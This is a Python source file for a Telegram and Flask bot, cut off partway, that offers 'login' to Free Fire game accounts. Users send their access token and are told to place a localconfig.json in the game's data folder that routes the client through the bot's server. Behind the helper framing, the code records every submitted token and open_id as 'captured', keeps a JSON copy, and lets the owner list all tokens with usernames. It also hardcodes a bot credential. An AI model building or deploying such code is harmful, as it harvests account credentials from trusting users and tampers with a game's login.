from flask import Flask, request, Response
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import urllib3
import binascii
import threading
import json
import os
import sqlite3
import asyncio
import time
from test import *
from datetime import datetime
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============ RENDER SPECIFIC CONFIG ============
import os
PORT = int(os.environ.get('PORT', 5000))
DB_PATH = "/tmp/bot_database.db"
TOKEN_JSON_PATH = "/tmp/access_token.json"
# Render URL পেতে (যদি সেট করা থাকে)
RENDER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'http://0.0.0.0')
LOCAL_IP = RENDER_URL.replace('https://', '').replace('http://', '') if 'onrender.com' in RENDER_URL else '0.0.0.0'
# ================================================

BOT_TOKEN = "8702141797:AAGu0cpb522YHnj2__2uCrHLQtz4qx-RPsA"
OWNER_ID = 157828443
BOT_USERNAME = "@DAIYAN_LOGIN_BOT"
CHANNEL_USERNAME = "@Daiyan_FF"
DEV_USERNAME = "@Daiyan_FF"
MAINTENANCE_MODE = False
sessions = {}
session_lock = threading.Lock()
active_sessions = {}
active_sessions_lock = threading.Lock()

app = Flask(__name__)

def init_database():
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            chat_id INTEGER,
            joined_at TEXT,
            is_blocked INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            open_id TEXT,
            access_token TEXT UNIQUE,
            captured_at TEXT,
            FOREIGN KEY(user_id) REFERENCES users(user_id)
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS broadcasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            message TEXT,
            sent_at TEXT,
            total_sent INTEGER
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS sessions_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            access_token TEXT,
            open_id TEXT,
            started_at TEXT,
            stopped_at TEXT,
            is_active INTEGER DEFAULT 1
        )
    """)
    c.execute("CREATE INDEX IF NOT EXISTS idx_tokens_user ON tokens(user_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_tokens_access ON tokens(access_token)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_sessions_user ON sessions_log(user_id)")
    c.execute("INSERT OR IGNORE INTO config (key, value) VALUES ('maintenance', 'false')")
    conn.commit()
    conn.close()

def db_add_user(user_id, username, first_name, chat_id):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            INSERT OR IGNORE INTO users (user_id, username, first_name, chat_id, joined_at)
            VALUES (?, ?, ?, ?, ?)
        """, (user_id, username or "N/A", first_name or "N/A", chat_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
    except:
        pass

def db_get_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        return c.fetchone()
    except:
        return None

def db_get_all_users():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT * FROM users ORDER BY joined_at DESC")
        return c.fetchall()
    except:
        return []

def db_get_total_users():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 0")
        return c.fetchone()[0]
    except:
        return 0

def db_save_token(user_id, open_id, access_token):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            INSERT OR IGNORE INTO tokens (user_id, open_id, access_token, captured_at)
            VALUES (?, ?, ?, ?)
        """, (user_id, open_id, access_token, timestamp))
        conn.commit()
        if c.rowcount > 0:
            save_token_to_json(user_id, open_id, access_token, timestamp)
            conn.close()
            return True
        conn.close()
        return False
    except:
        return False

def save_token_to_json(user_id, open_id, access_token, timestamp):
    try:
        data = []
        if os.path.exists(TOKEN_JSON_PATH):
            try:
                with open(TOKEN_JSON_PATH, "r") as f:
                    data = json.load(f)
            except:
                data = []
        for d in data:
            if d.get("access_token") == access_token:
                return
        data.append({
            "user_id": user_id,
            "open_id": open_id,
            "access_token": access_token,
            "captured_at": timestamp
        })
        with open(TOKEN_JSON_PATH, "w") as f:
            json.dump(data, f, indent=4)
    except:
        pass

def db_get_user_tokens(user_id):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT * FROM tokens WHERE user_id = ? ORDER BY id DESC", (user_id,))
        return c.fetchall()
    except:
        return []

def db_get_all_tokens():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            SELECT tokens.*, users.username, users.first_name 
            FROM tokens LEFT JOIN users ON tokens.user_id = users.user_id 
            ORDER BY tokens.id DESC
        """)
        return c.fetchall()
    except:
        return []

def db_get_total_tokens():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM tokens")
        return c.fetchone()[0]
    except:
        return 0

def db_ban_user(user_id, ban=True):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (1 if ban else 0, user_id))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def db_save_broadcast(message, total_sent):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            INSERT INTO broadcasts (message, sent_at, total_sent)
            VALUES (?, ?, ?)
        """, (message, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), total_sent))
        conn.commit()
        conn.close()
    except:
        pass

def db_get_maintenance():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT value FROM config WHERE key = 'maintenance'")
        row = c.fetchone()
        return row and row[0] == 'true'
    except:
        return False

def db_set_maintenance(status):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("UPDATE config SET value = ? WHERE key = 'maintenance'", ('true' if status else 'false',))
        conn.commit()
        conn.close()
    except:
        pass

def db_log_session(user_id, access_token, open_id, started_at, stopped_at=None, is_active=1):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            INSERT INTO sessions_log (user_id, access_token, open_id, started_at, stopped_at, is_active)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (user_id, access_token, open_id, started_at, stopped_at, is_active))
        conn.commit()
        conn.close()
    except:
        pass

def db_stop_active_sessions(user_id):
    try:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            UPDATE sessions_log SET stopped_at = ?, is_active = 0
            WHERE user_id = ? AND is_active = 1
        """, (now, user_id))
        conn.commit()
        conn.close()
    except:
        pass

def db_get_active_session(user_id):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            SELECT * FROM sessions_log 
            WHERE user_id = ? AND is_active = 1 
            ORDER BY id DESC LIMIT 1
        """, (user_id,))
        return c.fetchone()
    except:
        return None

def db_get_user_session_count(user_id):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM sessions_log WHERE user_id = ?", (user_id,))
        return c.fetchone()[0]
    except:
        return 0

init_database()
MAINTENANCE_MODE = db_get_maintenance()

def get_keyboard(user_id):
    keyboard = [
        [KeyboardButton("ʟᴏɢɪɴ ɢᴀᴍᴇ"), KeyboardButton("sᴛᴏᴘ sᴇssɪᴏɴ")],
        [KeyboardButton("sᴛᴀᴛᴜs")]
    ]
    if user_id == OWNER_ID:
        keyboard.append([KeyboardButton("🛠️ ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ")])
    keyboard.append([KeyboardButton("ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def check_sub(user_id, context):
    return True

async def start(update, context):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = escape(update.effective_user.first_name or "User")
    chat_id = update.effective_chat.id
    
    if MAINTENANCE_MODE and user_id != OWNER_ID:
        return await update.message.reply_text("🔧 <b>Bot Under Maintenance!</b>", parse_mode="HTML")
    
    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        return await update.message.reply_text("🚫 <b>You are banned!</b>", parse_mode="HTML")
    
    db_add_user(user_id, username, first_name, chat_id)
    with session_lock:
        sessions[str(user_id)] = {"chat_id": chat_id, "tokens": []}
    
    await update.message.reply_html(
    f"🎉 <b>ᴡᴇʟᴄᴏᴍᴇ, {first_name}!</b>\n\n"
    f"✅ <b>ʏᴏᴜʀ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ.</b>\n\n"
    f"🤖 <b>ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n"
    f"ᴛʜɪs ʙᴏᴛ ʜᴇʟᴘs ʏᴏᴜ sᴜᴄᴄᴇssꜰᴜʟʟʏ ʟᴏɢɪɴ ᴛᴏ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ ᴜsɪɴɢ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɴᴅ ᴇɴᴊᴏʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs ᴡɪᴛʜ ɴᴏ ʙᴀɴ ɪssᴜᴇ. 100% sᴀꜰᴇ.\n\n"
    f"📌 <b>ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n"
    f"• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ <b>ʟᴏɢɪɴ ɢᴀᴍᴇ</b> ʙᴜᴛᴛᴏɴ\n"
    f"• ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ\n"
    f"• ʏᴏᴜʀ ᴘʀᴏxʏ ᴜʀʟ ᴡɪʟʟ ʙᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ\n"
    f"• ꜰᴏʟʟᴏᴡ ᴛʜᴇ ɪɴsᴛʀᴜᴄᴛɪᴏɴs ᴛᴏ sᴇᴛ ᴜᴘ <code>localconfig.json</code>\n"
    f"• ᴄʜᴏᴏsᴇ ᴀɴʏ ᴘʟᴀᴛꜰᴏʀᴍ ᴀɴᴅ ʟᴏɢɪɴ ᴛᴏ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ\n"
    f"• ᴏɴᴄᴇ ʟᴏɢɢᴇᴅ ɪɴ, ʏᴏᴜ ᴄᴀɴ ᴘʟᴀʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs\n\n"
    f"ℹ️ <b>ɪᴍᴘᴏʀᴛᴀɴᴛ ɴᴏᴛᴇ</b>\n"
    f"ᴀs ʟᴏɴɢ ᴀs ᴛʜᴇ sᴇssɪᴏɴ ʀᴇᴍᴀɪɴs ᴀᴄᴛɪᴠᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ʏᴏᴜ ᴄᴀɴ ʟᴏɢɪɴ ᴛᴏ ʏᴏᴜʀ ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ. ᴏɴᴄᴇ ᴛʜᴇ sᴇssɪᴏɴ ᴇɴᴅs ᴏʀ sᴛᴏᴘs, ʏᴏᴜ ᴡɪʟʟ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɢᴀɪɴ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ sᴇssɪᴏɴ ꜰᴏʀ ʟᴏɢɢɪɴɢ ɪɴ.\n\n"
    f"⚠️ <b>ᴘʀᴇᴄᴀᴜᴛɪᴏɴ</b>\n"
    f"ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴏʀ ᴘʀᴏxʏ ᴜʀʟ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ. ᴋᴇᴇᴘ ɪᴛ ᴘʀɪᴠᴀᴛᴇ.\n\n"
    f"📜 <b>ᴅɪsᴄʟᴀɪᴍᴇʀ</b>\n"
    f"ᴛʜɪs ʙᴏᴛ ɪs ᴘʀᴏᴠɪᴅᴇᴅ ꜰᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴀɴᴅ ᴛᴇsᴛɪɴɢ ᴘᴜʀᴘᴏsᴇs ᴏɴʟʏ. ᴜsᴇ ɪᴛ ʀᴇsᴘᴏɴsɪʙʟʏ ᴀɴᴅ ᴏɴʟʏ ᴡɪᴛʜ ᴀᴄᴄᴏᴜɴᴛs ʏᴏᴜ ᴀʀᴇ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴄᴄᴇss.\n\n"
    f"👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ</b> @VISWAJEETHU",
        reply_markup=get_keyboard(user_id))

async def handle_buttons(update, context):
    user_id = update.effective_user.id
    text = update.message.text
    
    if MAINTENANCE_MODE and user_id != OWNER_ID:
        return await update.message.reply_text("🔧 <b>Maintenance!</b>", parse_mode="HTML")
    
    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        return await update.message.reply_text("❌ Banned.")
    
    if text == "ʟᴏɢɪɴ ɢᴀᴍᴇ":
        active_session = db_get_active_session(user_id)
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions
        
        if active_session or has_active:
            with active_sessions_lock:
                si = active_sessions.get(str(user_id), {})
            st = active_session[4] if active_session else si.get("started_at", "Unknown")
            return await update.message.reply_html(
                f"<b>⚠️ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ ʟᴏᴄᴋᴇᴅ</b>\n\n"
                f"🕒 <b>Started:</b> <code>{st}</code>\n\n"
                f"ᴘʟᴇᴀsᴇ ᴘʀᴇss <b>sᴛᴏᴘ sᴇssɪᴏɴ</b> ꜰɪʀsᴛ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ ᴏɴᴇ.")
        
        context.user_data["awaiting_token"] = True
        await update.message.reply_html(
            "<b>ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴛᴏ ʟᴏɢɪɴ ʏᴏᴜʀ ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ</b>\n\n"
            "ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ <b>ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ</b> ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ sᴇssɪᴏɴ.\n\n"
            "📝 <b>Send your access token below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>")
    
    elif text == "sᴛᴏᴘ sᴇssɪᴏɴ":
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions
            if has_active:
                active_sessions.pop(str(user_id), None)
        
        db_session = db_get_active_session(user_id)
        if not has_active and not db_session:
            return await update.message.reply_html("<b> ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ</b>\n\nʏᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴀɴʏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ ᴛᴏ sᴛᴏᴘ.")
        
        sf = os.path.join("user_sessions", f"response_{user_id}.hex")
        if os.path.exists(sf):
            os.remove(sf)
        db_stop_active_sessions(user_id)
        await update.message.reply_html(
            "<b>✅ sᴇssɪᴏɴ sᴛᴏᴘᴘᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ!</b>\n\n"
            "ʏᴏᴜʀ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ.\n"
            "ʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ sᴇssɪᴏɴ ʙʏ ᴘʀᴇssɪɴɢ <b>🎮 ʟᴏɢɪɴ ɢᴀᴍᴇ</b>.")
    
    elif text == "sᴛᴀᴛᴜs":
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions
            si = active_sessions.get(str(user_id), {})
        
        db_session = db_get_active_session(user_id)
        total_sessions = db_get_user_session_count(user_id)
        total_users = db_get_total_users()
        total_tokens = db_get_total_tokens()
        
        if db_session:
            status = "🟢 ᴀᴄᴛɪᴠᴇ"
            st = db_session[4]
            tok = db_session[2][:20] + "..." if db_session[2] else "N/A"
            oid = db_session[3] or "N/A"
            try:
                sd = datetime.strptime(st, "%Y-%m-%d %H:%M:%S")
                dur = datetime.now() - sd
                h, r = divmod(int(dur.total_seconds()), 3600)
                m, s = divmod(r, 60)
                dur_s = f"{h}h {m}m {s}s"
            except:
                dur_s = "N/A"
        elif has_active and si:
            status = "🟢 ᴀᴄᴛɪᴠᴇ"
            st = si.get("started_at", "Unknown")
            tok = si.get("access_token", "N/A")[:20] + "..." or "N/A"
            oid = si.get("open_id", "N/A")
            try:
                sd = datetime.strptime(st, "%Y-%m-%d %H:%M:%S") if st != "Unknown" else None
                if sd:
                    dur = datetime.now() - sd
                    h, r = divmod(int(dur.total_seconds()), 3600)
                    m, s = divmod(r, 60)
                    dur_s = f"{h}h {m}m {s}s"
                else:
                    dur_s = "N/A"
            except:
                dur_s = "N/A"
        else:
            status = "🔴 ɪɴᴀᴄᴛɪᴠᴇ"
            st = "N/A"
            tok = "N/A"
            oid = "N/A"
            dur_s = "N/A"
        
        await update.message.reply_html(
f"<b>ɢᴀʀᴇɴᴀ ʟᴏɢɪɴ sᴇssɪᴏɴ sᴛᴀᴛᴜs</b>\n\n"
f"<b>sᴛᴀᴛᴜs:</b> {status}\n\n"
f"━━━━━━━━━━━━━━━\n"
f"<b>ᴄᴜʀʀᴇɴᴛ sᴇssɪᴏɴ</b>\n"
f" <b>sᴛᴀʀᴛ:</b> <code>{st}</code>\n"
f" <b>ᴅᴜʀᴀᴛɪᴏɴ:</b> <code>{dur_s}</code>\n"
f" <b>ᴏᴘᴇɴ ɪᴅ:</b> <code>{oid}</code>\n"
f" <b>ᴛᴏᴋᴇɴ:</b> <code>{tok}</code>\n\n"
f"━━━━━━━━━━━━━━━\n"
f"<b>ʏᴏᴜʀ sᴛᴀᴛs</b>\n"
f" <b>sᴇssɪᴏɴs:</b> <code>{total_sessions}</code>\n"
f"━━━━━━━━━━━━━━━\n"
f"<b>ᴛᴏᴛᴀʟ ʙᴏᴛ ᴜsᴇʀs</b>\n"
f" <b>ᴜsᴇʀs:</b> <code>{total_users}</code>"
        )
    
    elif text == "ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ":
        await update.message.reply_html(
f"<b>🤖 ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n\n"
f"⚡ <b>ᴘᴜʀᴘᴏsᴇ:</b> sɪᴍᴘʟɪꜰɪᴇs ᴛʜᴇ ʟᴏɢɪɴ ᴀɴᴅ sᴇssɪᴏɴ sᴇᴛᴜᴘ ᴘʀᴏᴄᴇss.\n"
f"🔐 <b>ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ:</b> ᴜsᴇs ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ sᴇᴄᴜʀᴇ sᴇssɪᴏɴ.\n"
f"🌐 <b>ᴘʀᴏxʏ:</b> ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ɢᴇɴᴇʀᴀᴛᴇs ᴀ ᴘʀᴏxʏ ᴜʀʟ ꜰᴏʀ ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ.\n"
f"📂 <b>ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ:</b> ᴘʀᴏᴠɪᴅᴇs ʟᴏᴄᴀʟᴄᴏɴꜰɪɢ.ᴊsᴏɴ sᴇᴛᴜᴘ ɪɴsᴛʀᴜᴄᴛɪᴏɴs.\n"
f"📱 <b>ᴘʟᴀᴛꜰᴏʀᴍ sᴜᴘᴘᴏʀᴛ:</b> sᴜᴘᴘᴏʀᴛs ᴍᴜʟᴛɪᴘʟᴇ ʟᴏɢɪɴ ᴘʟᴀᴛꜰᴏʀᴍs.\n"
f"🚀 <b>ɪɴᴛᴇʀꜰᴀᴄᴇ:</b> ꜰᴀsᴛ, sɪᴍᴘʟᴇ, ᴀɴᴅ ᴜsᴇʀ-ꜰʀɪᴇɴᴅʟʏ.\n"
f"🔒 <b>ᴘʀɪᴠᴀᴄʏ:</b> ᴋᴇᴇᴘ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɴᴅ ᴘʀᴏxʏ ᴜʀʟ ᴘʀɪᴠᴀᴛᴇ.\n"
f"📖 <b>ɴᴏᴛᴇ:</b> ᴜsᴇ ᴛʜɪs ʙᴏᴛ ᴏɴʟʏ ᴡɪᴛʜ ᴀᴄᴄᴏᴜɴᴛs ʏᴏᴜ ᴀʀᴇ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴄᴄᴇss.\n\n"
f"<b>ᴏꜰꜰɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ:</b> @FREEFlRECODE\n"
f"<b>ᴅᴇᴠᴇʟᴏᴘᴇʀ:</b> @VISWAJEETHU")
    
    elif text == "🛠️ ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ" and user_id == OWNER_ID:
        await owner_panel(update, context)

async def handle_token_input(update, context):
    user_id = update.effective_user.id
    token = update.message.text.strip()
    
    if token == "/cancel":
        context.user_data["awaiting_token"] = False
        return await update.message.reply_html("ᴏᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ.", reply_markup=get_keyboard(user_id))
    
    processing_msg = await update.message.reply_html("<i> ᴘʀᴏᴄᴇssɪɴɢ ᴛᴏᴋᴇɴ ᴀɴᴅ ɢᴇɴᴇʀᴀᴛɪɴɢ ᴛʜᴇ sᴇssɪᴏɴ......</i>")
    
    hex_content, open_id = generate_hex_content(token)
    
    if not hex_content:
        context.user_data["awaiting_token"] = False
        try:
            await processing_msg.delete()
        except Exception:
            pass
        return await update.message.reply_html(
            "<b>ɪɴᴠᴀʟɪᴅ ᴛᴏᴋᴇɴ</b>\n\n"
            "ᴛʜᴇ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ ᴅɪᴅ ɴᴏᴛ ᴘʀᴏᴅᴜᴄᴇ ᴀ ᴠᴀʟɪᴅ ʀᴇsᴘᴏɴsᴇ.\n"
            "ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ.",
            reply_markup=get_keyboard(user_id))
    
    os.makedirs("user_sessions", exist_ok=True)
    with open(os.path.join("user_sessions", f"response_{user_id}.hex"), 'w') as f:
        f.write(hex_content)
    
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with active_sessions_lock:
        active_sessions[str(user_id)] = {
            "access_token": token,
            "open_id": open_id,
            "started_at": now
        }
    
    db_log_session(user_id, token, open_id, now)
    db_save_token(user_id, open_id, token)
    
    context.user_data["awaiting_token"] = False
    server_url = f"https://{LOCAL_IP}/{user_id}/" if 'onrender.com' in LOCAL_IP else f"http://{LOCAL_IP}:{PORT}/{user_id}/"
    config_data = {"serverUrl": server_url}
    config_json = json.dumps(config_data, indent=2)
    temp_config = f"lcfg_{user_id}.json"
    try:
        with open(temp_config, 'w', encoding='utf-8') as f:
            f.write(config_json)
    except Exception as e:
        print(f"Failed to create config file: {e}")
    
    try:
        await processing_msg.delete()
    except:
        pass
    
    await update.message.reply_html(
    f"✅ <b>sᴜᴄᴄᴇssꜰᴜʟʟʏ ᴄʀᴇᴀᴛᴇᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɴᴅ sᴇʀᴠᴇʀ ᴜʀʟ</b>\n\n"
    f"<code>{server_url}</code>\n\n"
    f"📋 <b>ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n\n"
    f"1. ᴄᴏᴘʏ ᴛʜᴇ sᴇʀᴠᴇʀ ᴜʀʟ ᴀʙᴏᴠᴇ\n"
    f"2. ɢᴏ ᴛᴏ ᴛʜɪs ᴅɪʀᴇᴄᴛᴏʀʏ:\n"
    f"<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
    f"3. ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ ғɪʟᴇ ɴᴀᴍᴇᴅ <code>localconfig.json</code>\n"
    f"4. ᴘᴀsᴛᴇ ᴛʜᴇ ғᴏʟʟᴏᴡɪɴɢ ᴄᴏɴᴛᴇɴᴛ ɪɴᴛᴏ ᴛʜᴇ ғɪʟᴇ:\n"
    f"<pre><code>{{\n  \"serverUrl\": \"{server_url}\"\n}}</code></pre>\n"
    f"5. sᴀᴠᴇ ᴛʜᴇ ғɪʟᴇ\n"
    f"6. ᴏᴘᴇɴ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx, ᴄʜᴏᴏsᴇ ᴀɴʏ ᴘʟᴀᴛꜰᴏʀᴍ ᴀɴᴅ ʟᴏɢɪɴ ᴛᴏ ʏᴏᴜʀ ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ\n"
    f"7. ᴏɴᴄᴇ ʟᴏɢɢᴇᴅ ɪɴ, ʏᴏᴜ ᴄᴀɴ ᴘʟᴀʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs\n\n"
    f"⚠️ <b>ɴᴏᴛᴇ:</b> ᴡᴏʀᴋs ᴡɪᴛʜ ʙᴏᴛʜ ꜰʀᴇᴇ ꜰɪʀᴇ ᴀɴᴅ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx.\n"
    f"ᴅᴍ @VISWAJEETHU ɪғ ʏᴏᴜ ғᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs.",
        reply_markup=get_keyboard(user_id)
    )
    
    try:
        await update.message.reply_document(
            document=open(temp_config, 'rb'),
            filename="localconfig.json",
            caption=(
    "📂 ᴘʟᴀᴄᴇ ᴛʜɪs ғɪʟᴇ ɪɴ ʏᴏᴜʀ ɢᴀᴍᴇ ᴅɪʀᴇᴄᴛᴏʀʏ\n\n"
    "<b>ʜᴏᴡ ᴛᴏ ᴜsᴇ:</b>\n"
    "1. ᴅᴏᴡɴʟᴏᴀᴅ ᴛʜᴇ ғɪʟᴇ\n"
    "2. ᴏᴘᴇɴ ᴛʜᴇ ғᴏʟᴅᴇʀ ᴡʜᴇʀᴇ ᴛʜᴇ ғɪʟᴇ ᴡᴀs ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ\n"
    "3. ᴄᴏᴘʏ ᴛʜᴇ ғɪʟᴇ\n"
    "4. ɢᴏ ᴛᴏ:\n"
    "<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
    "5. ᴘᴀsᴛᴇ ᴛʜᴇ ғɪʟᴇ ɪɴᴛᴏ ᴛʜɪs ғᴏʟᴅᴇʀ\n"
    "6. ᴏᴘᴇɴ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx, ᴄʜᴏᴏsᴇ ᴀɴʏ ᴘʟᴀᴛꜰᴏʀᴍ ᴀɴᴅ ʟᴏɢɪɴ ᴛᴏ ʏᴏᴜʀ ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ\n"
    "7. ᴏɴᴄᴇ sᴜᴄᴄᴇssғᴜʟʟʏ ʟᴏɢɢᴇᴅ ɪɴ, ʏᴏᴜ ᴄᴀɴ ᴘʟᴀʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs\n\n"
